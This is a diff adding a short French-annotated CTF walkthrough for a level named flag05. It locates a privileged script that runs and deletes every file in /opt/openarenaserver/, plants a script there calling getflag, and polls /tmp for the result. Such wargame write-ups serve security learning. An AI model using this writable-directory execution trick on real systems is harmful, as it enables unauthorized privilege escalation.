@@ -1,0 +1,23 @@
+find / -user flag05 2>/dev/null
+un trouve un script
+
+/usr/sbin/openarenaserver
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+ce script execute tous ce qu'il y a dans "/opt/openarenaserver/"
+
+cd /opt/openarenaserver/.
+nano flag05.sh
+
+echo `getflag` > /tmp/flag05
+
+sh /usr/sbin/openarenaserver
+
+
+rm -rf /tmp/lolilol; echo "getflag > /tmp/lolilol" > /opt/openarenaserver/script.sh && while [ ! -f /tmp/lolilol ] ; do       sleep 2; done && cat /tmp/lolilol
